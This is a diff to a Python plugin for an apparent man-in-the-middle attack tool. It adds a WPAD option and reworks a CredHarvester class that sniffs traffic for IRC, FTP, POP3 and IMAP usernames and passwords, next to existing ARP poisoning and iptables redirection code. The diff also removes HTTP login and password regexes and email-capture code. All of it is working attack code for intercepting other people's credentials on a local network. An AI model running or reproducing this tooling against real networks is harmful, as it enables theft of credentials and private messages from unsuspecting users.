@@ -1,5 +1,7 @@
 #
-# DNS Spoofing code has been stolen from https://github.com/DanMcInerney/dnsspoof/
+# DNS tampering code stolen from https://github.com/DanMcInerney/dnsspoof
+#
+# CredHarvesting code stolen from https://github.com/DanMcInerney/creds.py
 #
 
 from twisted.internet import reactor
@@ -37,6 +39,7 @@ class Spoof(Plugin):
         self.interface = options.interface
         self.arp = options.arp
         self.icmp = options.icmp
+        self.wpad = options.wpad
         self.dns = options.dns
         self.dnscfg = options.dnscfg
         self.dhcp = options.dhcp
@@ -130,9 +133,9 @@ class Spoof(Plugin):
             print '[*] Setting up iptables'
             os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port %s' % self.port)
 
-        CHarvester = CredHarvester(self.interface)
+        CHarvester = CredHarvester()
         t1 = threading.Thread(name='spoof_thread', target=thread_target, args=thread_args)
-        t2 = threading.Thread(name='cred_harvester', target=CHarvester.start(), args=())
+        t2 = threading.Thread(name='cred_harvester', target=CHarvester.start, args=(self.interface))
 
         for t in [t1, t2]:
             t.setDaemon(True)
@@ -373,39 +376,23 @@ class Spoof(Plugin):
             pkt = Ether(src=self.routermac, dst='ff:ff:ff:ff:ff:ff')/ARP(psrc=self.gateway, hwsrc=self.routermac, op=2)
             sendp(pkt, inter=1, count=5, iface=self.interface)
 
+class CredHarvester():
 
-class CredHarvester(interface):
-
-    iface = interface
     fragged = 0
     imapauth = 0
     popauth = 0
     ftpuser = None # Necessary since user and pass come in separate packets
     ircnick = None # Necessary since user and pass come in separate packets
-    oldmheaders = []
-    logins = {} # Printed on Ctrl-C
     # For concatenating fragmented packets
     prev_pkt = {6667:{}, # IRC
                 143:{},  # IMAP
                 110:{},  # POP3
-                80:{},   # HTTP
                 26:{},   # SMTP
                 25:{},   # SMTP
                 21:{}}   # FTP
 
-    #these field names were stolen from the etter.fields file (Ettercap Project)
-    http_userfields = ['log','login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
-                        'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
-                        'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
-                        'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
-                        'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in']
-
-    http_passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword', 
-                       'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword', 'login_password'
-                       'passwort', 'passwrd', 'wppassword', 'upasswd']
-
-    def __init__(self):
-        sniff(prn=self.pkt_sorter, iface=self.iface)
+    def start(self, interface):
+        sniff(prn=self.pkt_sorter, iface=interface)
 
     def pkt_sorter(self, pkt):
         if pkt.haslayer(Raw) and pkt.haslayer(TCP):
@@ -417,14 +404,7 @@ class CredHarvester(interface):
             self.seq     = pkt[TCP].seq
             self.load    = str(pkt[Raw].load)
 
-            if self.dport == 80 or self.sport == 80:
-                """ HTTP """
-                port = 80
-                # Catch fragmented pkts
-                self.header_lines = self.hb_parse(port)
-                return self.http_parser(port)
-
-            elif self.dport == 6667:
+            if self.dport == 6667:
                 """ IRC """
                 port = 6667
                 self.header_lines = self.hb_parse(port) # Join fragmented pkts
@@ -436,28 +416,17 @@ class CredHarvester(interface):
                 self.prev_pkt[port] = self.frag_joiner(port) # No headers in FTP so no need for hb_parse
                 self.ftp(port)
 
-            elif self.dport == 25 or self.dport == 26:
-                port = self.dport
-                self.header_lines = self.hb_parse(port) # Join fragmented pkts
-                self.email_parser('', 'Outgoing', '')
-
             elif self.sport == 110 or self.dport == 110:
                 """ POP3 """
                 port = 110
                 self.header_lines = self.hb_parse(port) # Join fragmented pkts
-                if self.dport == 110:
-                    self.mail_pw(port)
-                if self.sport == 110:
-                    self.email_parser('+OK', 'Incoming', 'POP')
+                self.mail_pw(port)
 
             elif self.sport == 143 or self.dport == 143:
                 """ IMAP """
                 port = 143
                 self.header_lines = self.hb_parse(port) # Join fragmented pkts
-                if self.dport == 143:
-                    self.mail_pw(port)
-                if self.sport == 143:
-                    self.email_parser('BODY[]', 'Incoming', 'IMAP')
+                self.mail_pw(port)
 
     def headers_body(self, protocol):
         try:
@@ -480,38 +449,6 @@ class CredHarvester(interface):
         self.headers, self.body = self.headers_body(self.prev_pkt[port][self.ack])
         return self.headers.split('\r\n')
 
-    def logins_check(self, port, user, pw):
-        for ip in self.logins:
-            if ip == self.src:
-                for x in self.logins[ip]:
-                    if x == (self.dest, port, user, pw):
-                        return 1
-                self.logins[ip].append((self.dest, port, user, pw))
-                return 0
-        self.logins[self.src] = [(self.dest, port, user, pw)]
-        return 0
-
-
-    ##################################################
-    #                    MAIL                        #
-    ##################################################
-    def email_parser(self, first_line, inout, proto):
-        """The email module was not giving me what I wanted"""
-        mail_header_finder = ['To: ', 'From: ', 'Date: ', 'Subject: ']
-        mail_headers = []
-        for h in self.header_lines:
-            for x in mail_header_finder:
-                if x in h:
-                   mail_headers.append(h)
-        if len(mail_headers) > 3:
-            if first_line in self.header_lines[0] and self.body != '':
-                # Prevent the headers from being repeated in output if msg is fragmented
-                if mail_headers != self.oldmheaders:
-                    self.oldmheaders = mail_headers
-                    print '[%s] %s %s email:' % (self.src, inout, proto)
-                    for m in mail_headers:
-                        print '   ', m
-
     def mail_pw(self, port):
         load = self.load.strip('\r\n')
 
@@ -530,8 +467,7 @@ class CredHarvester(interface):
     def mail_pw_auth(self, load, auth_find, proto, auth, port):
         if auth == 1:
             user, pw = load, 0
-            found = self.logins_check(port, user, pw)
-            print '[%s] %s auth: %s' % (self.src, proto, load)
+            logging.warning('[%s] %s auth: %s' % (self.src, proto, load))
             self.b64decode(load, port)
             return 0
 
@@ -546,119 +482,9 @@ class CredHarvester(interface):
             decoded = ''
         # Test to see if decode worked
         if '@' in decoded:
-            print '[%s] Decoded: %s' % (self.src, decoded)
+            logging.debug('%s Decoded: %s' % (self.src, decoded))
             decoded = decoded.split()
-            found = self.logins_check(port, decoded[0], decoded[1])
 
-    ##################################################
-    #                    HTTP                        #
-    ##################################################
-    def http_parser(self, port):
-
-        url = None
-        host = self.search_headers('host: ')
-        if host:
-            get = self.search_headers('get /')
-            post = self.search_headers('post /')
-            if get:
-                url = host+get
-            elif post:
-                url = host+post
-        else:
-            return
-
-        if url:
-            self.url_printer(url, post)
-
-            # Print search terms
-            searched = self.searches(url, host)
-            if searched:
-                print '[%s] Searched %s: %s' % (self.src, host, searched)
-
-
-        if post:
-            if self.body != '' and 'ocsp' not in host:
-                if self.fragged:
-                    print '[%s] POST load (frag): %s' % (self.src, self.body)
-                else:
-                    print '[%s] POST load: %s' % (self.src, self.body)
-
-        self.http_user_pass(host, port)
-
-    def http_user_pass(self, host, port):
-        """Regex out the passwords and usernames
-        If you think there's a good library for parsing load data I am here to tell you
-        I have tried several suggestions and they are all less reliable than this way
-        Feel free to prove otherwise"""
-        # email, user, username, name, login, log, loginID
-        user_regex = '([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og|[Ll]ogin[Ii][Dd])=([^&|;]*)'
-        # password, pass, passwd, pwd, psw, passwrd, passw
-        pw_regex = '([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp][Ss][Ww]|[Pp]asswrd|[Pp]assw)=([^&|;]*)'
-        username = re.findall(user_regex, self.body)
-        password = re.findall(pw_regex, self.body)
-        user = None
-        pw = None
-
-        if username:
-            for u in username:
-                user = u[1]
-                break
-
-        if password:
-            for p in password:
-                if p[1] != '':
-                    pw = p[1]
-                    break
-
-        if user:
-            print '[%s > %s] login:    %s' % (self.src, host, user)
-        if pw:
-            print '[%s > %s] password: %s' % (self.src, host, pw)
-            self.dest = host # So the destination will be saved as the hostname, not IP
-            found = self.logins_check(port, user, pw)
-
-    def url_printer(self, url, post):
-        if not self.args.verbose:
-            d = ['.jpg', '.jpeg', '.gif', '.png', '.css', '.ico', '.js', '.svg', '.woff']
-            if any(i in url for i in d):
-                return
-            url = url[:135]
-
-        if not self.fragged:
-            if post:
-                print '[%s] %s %s' % (self.src, 'POST', url)
-            else:
-                print '[%s] %s' % (self.src, url)
-
-    def search_headers(self, header):
-        for l in self.header_lines:
-            if header in l.lower():
-                line = l.split()
-                try:
-                    return line[1]
-                except Exception:
-                    return 0
-
-    def searches(self, url, host):
-        """ Find search terms from URLs. Prone to false positives but rather err on that side than false negatives
-        search, query, ?s, &q, ?q, search?p, searchTerm, keywords, command """
-        searched = re.search('((search|query|\?s|&q|\?q|search\?p|search[Tt]erm|keywords|command)=([^&][^&]*))', url)
-        if searched:
-            searched = searched.group(3)
-
-            # Common false positives
-            if 'select%20*%20from' in searched:
-                return 0
-            if host == 'geo.yahoo.com':
-                return 0
-
-            # Decode URL encoding
-            return unquote(searched).replace('+', ' ')
-
-
-    ##################################################
-    #                     FTP                        #
-    ##################################################
     def ftp(self, port):
         """Catch FTP usernames, passwords, and servers"""
         load = self.load.replace('\r\n', '')
@@ -666,61 +492,20 @@ class CredHarvester(interface):
         if port == self.dport:
             if 'USER ' in load:
                     user = load.strip('USER ')
-                    print '[%s > %s] FTP user:    ' % (self.src, self.dest), user
+                    logging.warning('[%s > %s] FTP user:    ' % (self.src, self.dest), user)
                     self.ftpuser = user
 
             elif 'PASS ' in load:
                     pw = load.strip('PASS ')
-                    print '[%s > %s] FTP password:' % (self.src, self.dest), pw
-                    # Necessary since usernames and passwords come in separate packets
-                    if self.ftpuser:
-                        self.logins_check(port, self.ftpuser, pw)
-                    else:
-                        self.logins_check(port, '', pw)
+                    logging.warning('[%s > %s] FTP password:' % (self.src, self.dest), pw)
 
-        if 'authentication failed' in load:
-            resp = load
-            print '[%s > %s] FTP response:' % (self.src, self.dest), resp
-
-        if '230 OK' in load:
-            resp = load
-            print '[%s > %s] FTP response:' % (self.src, self.dest), resp
-
-    ##################################################
-    #                     IRC                        #
-    ##################################################
     def irc(self, port):
-        """Catch IRC nicks, passwords, joins, parts, quits, messages"""
         load = self.load.split('\r\n')[0]
 
         if 'NICK ' in load:
             self.ircnick = load.strip('NICK ')
-            print '[%s > %s] IRC nick: %s' % (self.src, self.dest, self.ircnick)
+            logging.warning('[%s > %s] IRC nick: %s' % (self.src, self.dest, self.ircnick))
 
         elif 'NS IDENTIFY ' in load:
             ircpass = load.strip('NS IDENTIFY ')
-            print '[%s > %s] IRC password: %s' % (self.src, self.dest, ircpass)
-            if self.ircnick:
-                self.logins_check(port, self.ircnick, ircpass)
-            else:
-                self.logins_check(port, '', ircpass)
-
-        elif 'PRIVMSG ' in load:
-            load = load.split(' ', 2)
-            ircchannel = load[1]
-            ircmsg = load[2][1:] # Get rid of the beginning ":"
-            print '[%s] IRC msg to %s: %s' % (self.src, ircchannel, ircmsg)
-
-        elif 'JOIN ' in load:
-            ircjoin = load.strip('JOIN ').split()[0] # There's a parameter x we need to get rid of with the split
-            print '[%s > %s] IRC joined: %s' % (self.src, self.dest, ircjoin)
-
-        elif 'PART ' in load:
-            load = load.split()
-            ircchannel = load[1]
-            reason = load[2][1:]
-            print '[%s > %s] IRC left %s: %s' % (self.src, self.dest, ircchannel, reason)
-
-        elif 'QUIT ' in load:
-            ircquit = load.strip('QUIT :')
-            print '[%s > %s] IRC quit: %s' % (self.src, self.dest, ircquit)
+            logging.warning('[%s > %s] IRC password: %s' % (self.src, self.dest, ircpass))
